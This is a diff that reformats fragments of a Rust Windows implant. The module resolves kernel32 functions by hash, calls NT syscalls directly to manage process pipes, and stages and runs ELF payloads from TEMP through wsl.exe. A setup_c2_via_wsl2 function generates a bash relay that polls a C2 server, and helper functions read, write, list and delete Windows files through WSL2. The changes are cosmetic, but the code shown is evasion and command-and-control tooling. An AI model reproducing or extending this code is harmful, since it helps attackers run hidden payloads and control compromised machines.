@@ -49,12 +49,12 @@ use std::os::windows::ffi::OsStrExt;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
-use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
 use crate::win_types::HANDLE;
 use crate::win_types::LARGE_INTEGER;
+use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
 
 use crate::pe_resolve_macros::hash_str_const;
 use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
@@ -110,8 +110,8 @@ const DEFAULT_HTTP_TIMEOUT_S: u64 = 30;
 
 // kernel32.dll wide string for module hash
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 
 /// Pre-computed API hashes for kernel32.dll exports.
@@ -148,10 +148,10 @@ type FnCreateProcessW = unsafe extern "system" fn(
 ) -> i32; // BOOL
 
 type FnCreatePipe = unsafe extern "system" fn(
-    *mut HANDLE,                                       // hReadPipe
-    *mut HANDLE,                                       // hWritePipe
-    *mut crate::win_types::SECURITY_ATTRIBUTES,  // lpPipeAttributes
-    DWORD,                                             // nSize
+    *mut HANDLE,                                // hReadPipe
+    *mut HANDLE,                                // hWritePipe
+    *mut crate::win_types::SECURITY_ATTRIBUTES, // lpPipeAttributes
+    DWORD,                                      // nSize
 ) -> i32; // BOOL
 
 type FnWaitForSingleObject = unsafe extern "system" fn(
@@ -160,35 +160,35 @@ type FnWaitForSingleObject = unsafe extern "system" fn(
 ) -> DWORD;
 
 type FnGetExitCodeProcess = unsafe extern "system" fn(
-    HANDLE,  // hProcess
+    HANDLE,     // hProcess
     *mut DWORD, // lpExitCode
 ) -> i32; // BOOL
 
 type FnGetLastError = unsafe extern "system" fn() -> DWORD;
 
 type FnCreateFileW = unsafe extern "system" fn(
-    *mut u16, // lpFileName
-    DWORD,    // dwDesiredAccess
-    DWORD,    // dwShareMode
+    *mut u16,    // lpFileName
+    DWORD,       // dwDesiredAccess
+    DWORD,       // dwShareMode
     *mut c_void, // lpSecurityAttributes
-    DWORD,    // dwCreationDisposition
-    DWORD,    // dwFlagsAndAttributes
-    HANDLE,   // hTemplateFile
+    DWORD,       // dwCreationDisposition
+    DWORD,       // dwFlagsAndAttributes
+    HANDLE,      // hTemplateFile
 ) -> HANDLE;
 
 type FnWriteFile = unsafe extern "system" fn(
-    HANDLE,   // hFile
+    HANDLE,        // hFile
     *const c_void, // lpBuffer
-    DWORD,    // nNumberOfBytesToWrite
-    *mut DWORD, // lpNumberOfBytesWritten
-    *mut c_void, // lpOverlapped
+    DWORD,         // nNumberOfBytesToWrite
+    *mut DWORD,    // lpNumberOfBytesWritten
+    *mut c_void,   // lpOverlapped
 ) -> i32; // BOOL
 
 type FnReadFile = unsafe extern "system" fn(
-    HANDLE,   // hFile
+    HANDLE,      // hFile
     *mut c_void, // lpBuffer
-    DWORD,    // nNumberOfBytesToRead
-    *mut DWORD, // lpNumberOfBytesRead
+    DWORD,       // nNumberOfBytesToRead
+    *mut DWORD,  // lpNumberOfBytesRead
     *mut c_void, // lpOverlapped
 ) -> i32; // BOOL
 
@@ -198,7 +198,7 @@ type FnGetFileSizeEx = unsafe extern "system" fn(
 ) -> i32; // BOOL
 
 type FnGetTempPathW = unsafe extern "system" fn(
-    DWORD,   // nBufferLength
+    DWORD,    // nBufferLength
     *mut u16, // lpBuffer
 ) -> DWORD;
 
@@ -208,8 +208,8 @@ type FnDeleteFileW = unsafe extern "system" fn(
 
 type FnGetEnvironmentVariableW = unsafe extern "system" fn(
     *const u16, // lpName
-    *mut u16,    // lpBuffer
-    DWORD,       // nSize
+    *mut u16,   // lpBuffer
+    DWORD,      // nSize
 ) -> DWORD;
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -260,7 +260,10 @@ impl Api {
             get_file_size_ex: resolve!(GetFileSizeEx, HASH_GETFILESIZEEX)?,
             get_temp_path_w: resolve!(GetTempPathW, HASH_GETTEMPPATHW)?,
             delete_file_w: resolve!(DeleteFileW, HASH_DELETEFILEW)?,
-            get_environment_variable_w: resolve!(GetEnvironmentVariableW, HASH_GETENVIRONMENTVARIABLEW)?,
+            get_environment_variable_w: resolve!(
+                GetEnvironmentVariableW,
+                HASH_GETENVIRONMENTVARIABLEW
+            )?,
         })
     }
 }
@@ -585,14 +588,8 @@ impl Wsl2Executor {
         };
 
         // Execute: chmod +x (in case umask interferes) then run
-        let chmod_cmd = format!(
-            "wsl.exe {}chmod +x '{}'",
-            distro_flag, wsl_path
-        );
-        let run_cmd = format!(
-            "wsl.exe {}'{}' {}",
-            distro_flag, wsl_path, args_str
-        );
+        let chmod_cmd = format!("wsl.exe {}chmod +x '{}'", distro_flag, wsl_path);
+        let run_cmd = format!("wsl.exe {}'{}' {}", distro_flag, wsl_path, args_str);
 
         // Run chmod (ignore errors — file may already be executable)
         let _ = Self::spawn_and_capture(&api, &chmod_cmd, 5000, None);
@@ -702,19 +699,25 @@ impl Wsl2Executor {
             // Parent reads from stdout_read and stderr_read — non-inheritable
             let _ = crate::syscall!(
                 "NtSetInformationObject",
-                stdout_read as u64, 4u64,
-                &flag_off as *const _ as u64, flag_size
+                stdout_read as u64,
+                4u64,
+                &flag_off as *const _ as u64,
+                flag_size
             );
             let _ = crate::syscall!(
                 "NtSetInformationObject",
-                stderr_read as u64, 4u64,
-                &flag_off as *const _ as u64, flag_size
+                stderr_read as u64,
+                4u64,
+                &flag_off as *const _ as u64,
+                flag_size
             );
             // Parent writes to stdin_write — non-inheritable
             let _ = crate::syscall!(
                 "NtSetInformationObject",
-                stdin_write as u64, 4u64,
-                &flag_off as *const _ as u64, flag_size
+                stdin_write as u64,
+                4u64,
+                &flag_off as *const _ as u64,
+                flag_size
             );
         }
 
@@ -751,8 +754,13 @@ impl Wsl2Executor {
         if created == 0 {
             let err = unsafe { (api.get_last_error)() };
             Self::close_handles(
-                api, stdout_read, stdout_write, stderr_read, stderr_write,
-                stdin_read, stdin_write,
+                api,
+                stdout_read,
+                stdout_write,
+                stderr_read,
+                stderr_write,
+                stdin_read,
+                stdin_write,
             );
             bail!("CreateProcessW failed: error {}", err);
         }
@@ -868,11 +876,7 @@ impl Wsl2Executor {
     }
 
     /// Close all pipe handles (error-path cleanup).
-    fn close_handles(
-        api: &Api,
-        a: HANDLE, b: HANDLE, c: HANDLE,
-        d: HANDLE, e: HANDLE, f: HANDLE,
-    ) {
+    fn close_handles(api: &Api, a: HANDLE, b: HANDLE, c: HANDLE, d: HANDLE, e: HANDLE, f: HANDLE) {
         unsafe {
             let _ = crate::syscall!("NtClose", a as u64);
             let _ = crate::syscall!("NtClose", b as u64);
@@ -886,9 +890,7 @@ impl Wsl2Executor {
     /// Get the Windows TEMP directory path.
     fn get_temp_dir(api: &Api) -> Result<String> {
         let mut buf = [0u16; 512];
-        let len = unsafe {
-            (api.get_temp_path_w)(buf.len() as DWORD, buf.as_mut_ptr())
-        };
+        let len = unsafe { (api.get_temp_path_w)(buf.len() as DWORD, buf.as_mut_ptr()) };
 
         if len == 0 {
             bail!("GetTempPathW failed");
@@ -982,7 +984,11 @@ impl Wsl2Executor {
             if let Some(drive) = chars.next() {
                 if chars.next() == Some('/') {
                     let rest: String = chars.collect();
-                    return format!("{}:\\{}", drive.to_ascii_uppercase(), rest.replace('/', "\\"));
+                    return format!(
+                        "{}:\\{}",
+                        drive.to_ascii_uppercase(),
+                        rest.replace('/', "\\")
+                    );
                 }
             }
         }
@@ -1051,10 +1057,7 @@ impl Wsl2Networking {
     /// Writes a minimal relay script (bash + socat/curl) to the WSL2
     /// filesystem and runs it in the background.  The relay polls the
     /// C2 server and forwards data through the WSL2 network stack.
-    pub fn setup_c2_via_wsl2(
-        config: &Wsl2C2Config,
-        distro: Option<&str>,
-    ) -> Result<Wsl2Result> {
+    pub fn setup_c2_via_wsl2(config: &Wsl2C2Config, distro: Option<&str>) -> Result<Wsl2Result> {
         // Generate the relay script
         let relay_script = Self::generate_relay_script(config);
 
@@ -1204,7 +1207,9 @@ while true; do
 done
 "#,
             c2_url = config.c2_url,
-            headers = config.headers.iter()
+            headers = config
+                .headers
+                .iter()
                 .map(|(k, v)| format!("{}:{}", k, v))
                 .collect::<Vec<_>>()
                 .join(","),
@@ -1349,20 +1354,13 @@ impl Wsl2FileAccess {
     /// Read a Windows file via WSL2.
     ///
     /// Converts the Windows path to a WSL path and reads via `cat`.
-    pub fn read_file_via_wsl2(
-        windows_path: &str,
-        distro: Option<&str>,
-    ) -> Result<Vec<u8>> {
+    pub fn read_file_via_wsl2(windows_path: &str, distro: Option<&str>) -> Result<Vec<u8>> {
         let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
         let cmd = format!("cat '{}'", wsl_path);
         let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;
 
         if result.exit_code != 0 {
-            bail!(
-                "Failed to read {} via WSL2: {}",
-                wsl_path,
-                result.stderr
-            );
+            bail!("Failed to read {} via WSL2: {}", wsl_path, result.stderr);
         }
 
         Ok(result.stdout.into_bytes())
@@ -1380,73 +1378,45 @@ impl Wsl2FileAccess {
         let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
         let b64 = base64_encode(data);
 
-        let cmd = format!(
-            "bash -c 'echo \"{}\" | base64 -d > \"{}\"'",
-            b64, wsl_path
-        );
+        let cmd = format!("bash -c 'echo \"{}\" | base64 -d > \"{}\"'", b64, wsl_path);
 
         let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;
 
         if result.exit_code != 0 {
-            bail!(
-                "Failed to write {} via WSL2: {}",
-                wsl_path,
-                result.stderr
-            );
+            bail!("Failed to write {} via WSL2: {}", wsl_path, result.stderr);
         }
 
         Ok(())
     }
 
     /// List directory contents via WSL2.
-    pub fn list_dir_via_wsl2(
-        windows_path: &str,
-        distro: Option<&str>,
-    ) -> Result<Vec<String>> {
+    pub fn list_dir_via_wsl2(windows_path: &str, distro: Option<&str>) -> Result<Vec<String>> {
         let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
         let cmd = format!("ls -1 '{}'", wsl_path);
         let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;
 
         if result.exit_code != 0 {
-            bail!(
-                "Failed to list {} via WSL2: {}",
-                wsl_path,
-                result.stderr
-            );
+            bail!("Failed to list {} via WSL2: {}", wsl_path, result.stderr);
         }
 
-        Ok(result
-            .stdout
-            .lines()
-            .map(|l| l.to_string())
-            .collect())
+        Ok(result.stdout.lines().map(|l| l.to_string()).collect())
     }
 
     /// Delete a file via WSL2.
-    pub fn delete_file_via_wsl2(
-        windows_path: &str,
-        distro: Option<&str>,
-    ) -> Result<()> {
+    pub fn delete_file_via_wsl2(windows_path: &str, distro: Option<&str>) -> Result<()> {
         let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
         let cmd = format!("rm -f '{}'", wsl_path);
         let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;
 
         if result.exit_code != 0 {
-            bail!(
-                "Failed to delete {} via WSL2: {}",
-                wsl_path,
-                result.stderr
-            );
+            bail!("Failed to delete {} via WSL2: {}", wsl_path, result.stderr);
         }
 
         Ok(())
     }
 
     /// Check if a file exists via WSL2.
-    pub fn file_exists_via_wsl2(
-        windows_path: &str,
-        distro: Option<&str>,
-    ) -> bool {
+    pub fn file_exists_via_wsl2(windows_path: &str, distro: Option<&str>) -> bool {
         let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
         let cmd = format!("test -f '{}' && echo YES", wsl_path);
         Wsl2Executor::execute_wsl_command(&cmd, distro)
@@ -1455,10 +1425,7 @@ impl Wsl2FileAccess {
     }
 
     /// Get file metadata (size, permissions, modification time) via WSL2.
-    pub fn stat_file_via_wsl2(
-        windows_path: &str,
-        distro: Option<&str>,
-    ) -> Result<String> {
+    pub fn stat_file_via_wsl2(windows_path: &str, distro: Option<&str>) -> Result<String> {
         let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
         let cmd = format!("stat '{}'", wsl_path);
         let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;
@@ -1479,8 +1446,7 @@ impl Wsl2FileAccess {
 ///
 /// Standard base64 alphabet (RFC 4648 §4).
 fn base64_encode(data: &[u8]) -> String {
-    const TABLE: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
     let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
 
@@ -1550,10 +1516,7 @@ mod tests {
     #[test]
     fn test_base64_hello_world() {
         // "Hello, World!" — well-known test vector
-        assert_eq!(
-            base64_encode(b"Hello, World!"),
-            "SGVsbG8sIFdvcmxkIQ=="
-        );
+        assert_eq!(base64_encode(b"Hello, World!"), "SGVsbG8sIFdvcmxkIQ==");
     }
 
     #[test]
@@ -1598,9 +1561,7 @@ mod tests {
     #[test]
     fn test_windows_path_to_wsl_deep_path() {
         assert_eq!(
-            Wsl2Executor::windows_path_to_wsl(
-                r"C:\Users\admin\AppData\Local\Temp\w2e_abc123.elf"
-            ),
+            Wsl2Executor::windows_path_to_wsl(r"C:\Users\admin\AppData\Local\Temp\w2e_abc123.elf"),
             "/mnt/c/Users/admin/AppData/Local/Temp/w2e_abc123.elf"
         );
     }
@@ -1659,7 +1620,8 @@ mod tests {
 
     #[test]
     fn test_parse_distro_list_single() {
-        let output = "  NAME            STATE           VERSION\n  * Ubuntu         Running         2\n";
+        let output =
+            "  NAME            STATE           VERSION\n  * Ubuntu         Running         2\n";
         let distros = Wsl2Detector::parse_distro_list(output).unwrap();
         assert_eq!(distros.len(), 1);
         assert_eq!(distros[0].name, "Ubuntu");
